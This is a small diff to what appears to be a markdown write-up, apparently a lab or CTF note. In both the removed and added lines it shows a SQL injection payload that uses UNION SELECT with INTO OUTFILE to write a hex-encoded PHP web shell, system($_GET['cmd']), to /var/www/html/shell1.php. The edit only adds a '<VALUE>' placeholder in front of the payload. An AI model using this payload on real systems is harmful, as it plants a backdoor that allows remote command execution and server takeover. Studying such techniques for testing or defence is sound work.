@@ -57,5 +57,5 @@ mysql> select hex('<?php system($_GET["cmd"]) ?>');
 ```
 > then exec:
 ```
-'union select 1,unhex('3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E') INTO OUTFILE '/var/www/html/shell1.php' from webapp.queue-- -
+<VALUE>'union select 1,unhex('3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E') INTO OUTFILE '/var/www/html/shell1.php' from webapp.queue-- -
 ```
